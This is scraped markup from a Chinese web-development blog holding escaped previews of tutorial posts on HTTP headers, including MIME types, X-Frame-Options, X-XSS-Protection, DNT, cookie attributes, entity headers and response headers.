&lt;td style=&#34;text-align:left&#34;&gt;.xql&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xquery&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xsd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xsl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xslt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-xwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.x_b&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-x_b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sis&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.symbian.install&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sisx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.symbian.install&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.x_t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-x_t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ipa&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.iphone&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.apk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.android.package-archive&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xap&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-silverlight-app&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">72-http-23-实体首部字段Content-Type</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-qi-ta-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。&lt;/p&gt;
&lt;h2 id=&#34;常用的首部字段&#34;&gt;常用的首部字段&lt;/h2&gt;
&lt;h3 id=&#34;x-frame-options&#34;&gt;X-Frame-Options&lt;/h3&gt;
&lt;p&gt;首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。&lt;/p&gt;
&lt;p&gt;取值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DENY&lt;/strong&gt;：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SAMEORIGIN&lt;/strong&gt;：表示该页面可以在相同域名页面的 frame 中展示。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ALLOW-FROM uri&lt;/strong&gt;：表示该页面可以在指定来源的 frame 中展示。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM http://hackr.jp
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;x-xss-protection&#34;&gt;X-XSS-Protection&lt;/h3&gt;
&lt;p&gt;首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。&lt;/p&gt;
&lt;p&gt;当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。针对现代浏览器，会选择更强大的Content-Security-Policy。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-XSS-Protection: 0  //禁止XSS过滤。
X-XSS-Protection: 1  //启用XSS过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
X-XSS-Protection: 1; mode=block //启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
X-XSS-Protection: 1; report=&amp;lt;reporting-uri&amp;gt; //启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dnt&#34;&gt;DNT&lt;/h3&gt;
&lt;p&gt;首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;DNT:0 //同意被追踪
DNT:1 //拒绝被追踪
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于首部字段 DNT 的功能具备有效性，所以 Web 服务器需要对 DNT做对应的支持。&lt;/p&gt;
">71-http-22-其他首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-cookie-xiang-guan-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。&lt;/p&gt;
&lt;p&gt;Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。&lt;/p&gt;
&lt;p&gt;调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;首部类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Set-Cookie&lt;/td&gt;
&lt;td&gt;开始状态管理所使用的Cookie信息&lt;/td&gt;
&lt;td&gt;响应首部字段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cookie&lt;/td&gt;
&lt;td&gt;服务器接收到的Cookie信息&lt;/td&gt;
&lt;td&gt;请求首部字段&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;服务器&#34;&gt;服务器&lt;/h2&gt;
&lt;p&gt;当服务器准备开始管理客户端的状态时，会事先告知各种信息。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;属性&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;NAME=VALUE&lt;/td&gt;
&lt;td&gt;赋予 Cookie 的名称和其值（必需项）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;expires=DATE&lt;/td&gt;
&lt;td&gt;Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;path=PATH&lt;/td&gt;
&lt;td&gt;将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;domain=域名&lt;/td&gt;
&lt;td&gt;作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie的服务器的域名）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Secure&lt;/td&gt;
&lt;td&gt;仅在 HTTPS 安全通信时才会发送 Cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HttpOnly&lt;/td&gt;
&lt;td&gt;加以限制，使 Cookie 不能被 JavaScript 脚本访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;expires&#34;&gt;expires&lt;/h3&gt;
&lt;p&gt;Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。&lt;/p&gt;
&lt;p&gt;当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session）时间段内。这通常限于浏览器应用程序被关闭之前。&lt;/p&gt;
&lt;p&gt;另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。&lt;/p&gt;
&lt;h3 id=&#34;path&#34;&gt;path&lt;/h3&gt;
&lt;p&gt;限定可以发送Cookie的路径&lt;/p&gt;
&lt;p&gt;Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。&lt;/p&gt;
&lt;h3 id=&#34;domain&#34;&gt;domain&lt;/h3&gt;
&lt;p&gt;通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 &lt;code&gt;example.com&lt;/code&gt; 后，除&lt;code&gt;example.com&lt;/code&gt; 以外，&lt;code&gt;www.example.com&lt;/code&gt;或 &lt;code&gt;www2.example.com&lt;/code&gt; 等都可以发送 Cookie。&lt;/p&gt;
&lt;p&gt;因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全。&lt;/p&gt;
&lt;h3 id=&#34;secure&#34;&gt;secure&lt;/h3&gt;
&lt;p&gt;Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: name=value; secure
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上例子仅当在 &lt;code&gt;https://www.example.com/&lt;/code&gt;（HTTPS）安全连接的情况下才会进行 Cookie 的回收。也就是说，即使域名相同，&lt;code&gt;http://www.example.com/&lt;/code&gt;（HTTP）也不会发生 Cookie 回收行为。&lt;/p&gt;
&lt;p&gt;当省略 secure 属性时，不论 HTTP 还是 HTTPS，都会对 Cookie 进行回收。&lt;/p&gt;
&lt;h3 id=&#34;httponly&#34;&gt;HttpOnly&lt;/h3&gt;
&lt;p&gt;Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: name=value; HttpOnly
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持Cookie 了。&lt;/p&gt;
&lt;h2 id=&#34;客户端&#34;&gt;客户端&lt;/h2&gt;
&lt;p&gt;首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Cookie: status=enable
&lt;/code&gt;&lt;/pre&gt;
">70-http-21-cookie相关首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-shi-ti-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。&lt;/p&gt;
&lt;h2 id=&#34;列表&#34;&gt;列表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;实体首部&lt;/th&gt;
&lt;th&gt;作用（补充请求报文或响应报文相关信息）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Allow&lt;/td&gt;
&lt;td&gt;告诉客户端资源所支持的HTTP方法：&lt;code&gt;GET HEAD POST&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Encoding&lt;/td&gt;
&lt;td&gt;告知客户端，服务器对实体主体部分选用的内容编码方式：&lt;code&gt;gzip deflate&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Language&lt;/td&gt;
&lt;td&gt;告知客户端，实体主体使用的自然语言。：&lt;code&gt;zh-CN&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Length&lt;/td&gt;
&lt;td&gt;表明实体主体部分的大小，单位是字节。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Location&lt;/td&gt;
&lt;td&gt;表示返回的数据对应的URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-MD5&lt;/td&gt;
&lt;td&gt;Base64加密格式的内容 MD5检验值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Range&lt;/td&gt;
&lt;td&gt;主要用于范围请求，告知客户端当前发送部分的内容范围以及整个实体大小。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Type&lt;/td&gt;
&lt;td&gt;表明实体主体内对象的媒体类型。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expires&lt;/td&gt;
&lt;td&gt;内容的过期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Last_modified&lt;/td&gt;
&lt;td&gt;内容的最后修改时间&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;allow&#34;&gt;Allow&lt;/h3&gt;
&lt;p&gt;首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Allow: GET, HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-encoding&#34;&gt;Content-Encoding&lt;/h3&gt;
&lt;p&gt;首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。&lt;/p&gt;
&lt;p&gt;告知客户端以同样的方式解压。&lt;/p&gt;
&lt;p&gt;主要采用以下 4 种内容编码的方式。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gzip
compress
deflate
identity
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Encoding: gzip
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-language&#34;&gt;Content-Language&lt;/h3&gt;
&lt;p&gt;首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Language: zh-CN
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-length&#34;&gt;Content-Length&lt;/h3&gt;
&lt;p&gt;首部字段 Content-Length 表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length首部字段。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Length: 15000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该资源的大小为15000字节&lt;/p&gt;
&lt;h3 id=&#34;content-location&#34;&gt;Content-Location&lt;/h3&gt;
&lt;p&gt;首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。&lt;/p&gt;
&lt;p&gt;比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location内会写明 URI。（访问 &lt;code&gt;http://www.hackr.jp/&lt;/code&gt; 返回的对象却是&lt;code&gt;http://www.hackr.jp/index-ja.html&lt;/code&gt; 等类似情况）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Location: http://www.hackr.jp/index-ja.html
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-md5&#34;&gt;Content-MD5&lt;/h3&gt;
&lt;p&gt;首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。&lt;/p&gt;
&lt;p&gt;对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。&lt;/p&gt;
&lt;p&gt;采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;报文主体 -&amp;gt; MD5算法 -&amp;gt; Base64编码
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-range&#34;&gt;Content-Range&lt;/h3&gt;
&lt;p&gt;针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Range: bytes 5001-10000/10000
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;content-type&#34;&gt;Content-Type&lt;/h3&gt;
&lt;p&gt;首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。&lt;br&gt;
参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Type: text/html; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;expires&#34;&gt;Expires&lt;/h3&gt;
&lt;p&gt;首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。&lt;/p&gt;
&lt;p&gt;源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。&lt;/p&gt;
&lt;p&gt;但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Expires: Wed, 04 Jul 2012 08:26:05 GMT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;源服务器告知缓存服务器此缓存可使用到2012年7月4日&lt;/p&gt;
&lt;h3 id=&#34;last-modified&#34;&gt;Last-Modified&lt;/h3&gt;
&lt;p&gt;首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Last-Modified: Wed, 23 May 2012 09:59:55 GMT
&lt;/code&gt;&lt;/pre&gt;
">69-http-20-实体首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-xiang-ying-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。&lt;/p&gt;
&lt;h2 id=&#34;列表&#34;&gt;列表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;响应首部&lt;/th&gt;
&lt;th&gt;作用（响应报文专用）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Ranges&lt;/td&gt;
&lt;td&gt;告知客户端服务器是否可接受范围请求，是&lt;code&gt;bytes&lt;/code&gt;，否&lt;code&gt;none&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Age&lt;/td&gt;
&lt;td&gt;资源在代理缓存中存在的时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ETag&lt;/td&gt;
&lt;td&gt;资源标识，资源发生变化时标识也会发生改变&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Location&lt;/td&gt;
&lt;td&gt;客户端重定向到某个 URL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authenticate&lt;/td&gt;
&lt;td&gt;向代理服务器发送验证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Retry-After&lt;/td&gt;
&lt;td&gt;告知客户端应该在多久之后再次发送请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Server&lt;/td&gt;
&lt;td&gt;服务器名字：&lt;code&gt;Apache Nginx&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vary&lt;/td&gt;
&lt;td&gt;对缓存进行控制 &lt;code&gt;Vary: Accept-Language&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WWW-Authenticate&lt;/td&gt;
&lt;td&gt;定义了使用何种验证方式去获取对资源的连接。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;accept-ranges&#34;&gt;Accept-Ranges&lt;/h3&gt;
&lt;p&gt;首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。&lt;/p&gt;
&lt;p&gt;可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Accept-Ranges: bytes
Accept-Ranges: none    //不支持范围请求
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;age&#34;&gt;Age&lt;/h3&gt;
&lt;p&gt;首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。&lt;/p&gt;
&lt;p&gt;若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Age: 600
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;etag&#34;&gt;ETag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;ETag: &amp;quot;82e22293907ce725faf67773957acd12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag值。&lt;/p&gt;
&lt;p&gt;另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。&lt;/p&gt;
&lt;p&gt;资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 &lt;code&gt;http://www.google.com/&lt;/code&gt; 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;强 ETag 值和弱 Tag 值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ETag 中有强 ETag 值和弱 ETag 值之分。&lt;br&gt;
1、强 ETag 值&lt;br&gt;
强 ETag 值，不论实体发生多么细微的变化都会改变其值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ETag: &amp;quot;usagi-1234&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;弱 ETag 值&lt;br&gt;
弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;ETag: W/&amp;quot;usagi-1234&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;location&#34;&gt;Location&lt;/h3&gt;
&lt;p&gt;使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。&lt;/p&gt;
&lt;p&gt;基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。&lt;/p&gt;
&lt;p&gt;几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Location: http://www.usagidesign.jp/sample.html
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;proxy-authenticate&#34;&gt;Proxy-Authenticate&lt;/h3&gt;
&lt;p&gt;首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。&lt;/p&gt;
&lt;p&gt;它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Proxy-Authenticate: Basic realm=&amp;quot;Usagidesign Auth&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;retry-after&#34;&gt;Retry-After&lt;/h3&gt;
&lt;p&gt;首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。&lt;/p&gt;
&lt;p&gt;字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24GMT 等格式），也可以是创建响应后的秒数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Retry-After: Wed, 21 Oct 2015 07:28:00 GMT
Retry-After: 120
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;server&#34;&gt;Server&lt;/h3&gt;
&lt;p&gt;首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Server: Apache/2.2.17 (Unix)
Server: Apache/2.2.6 (Unix) PHP/5.2.5
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;vary&#34;&gt;Vary&lt;/h3&gt;
&lt;p&gt;首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。&lt;/p&gt;
&lt;p&gt;从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Vary: Accept-Language
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回&lt;/p&gt;
&lt;h3 id=&#34;www-authenticate&#34;&gt;WWW-Authenticate&lt;/h3&gt;
&lt;p&gt;首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate。&lt;/p&gt;
